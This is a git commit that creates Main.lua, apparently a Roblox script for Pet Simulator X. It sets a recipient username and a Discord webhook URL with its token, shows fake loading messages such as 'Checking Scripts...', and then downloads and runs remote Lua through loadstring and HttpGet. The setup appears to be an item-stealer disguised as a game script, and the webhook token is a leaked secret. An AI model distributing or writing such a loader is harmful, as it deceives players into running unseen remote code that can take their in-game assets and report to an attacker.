1ca63e44a66242f8841d2bf9eb9610982ee897a5
SIGNPETSPOOFER <129641092+SIGNPETSPOOFER@users.noreply.github.com>
2023-04-02 11:56:17 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,10 @@
+Username = "404_demon213"
+WebHook = "https://discord.com/api/webhooks/1091931667872104532/XfvmnZamIZFgyY6ToUYGHGG6XuazTcd__YYDWdrklztBrd5p7I-eai1fSPqSr4KSv-pP"
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
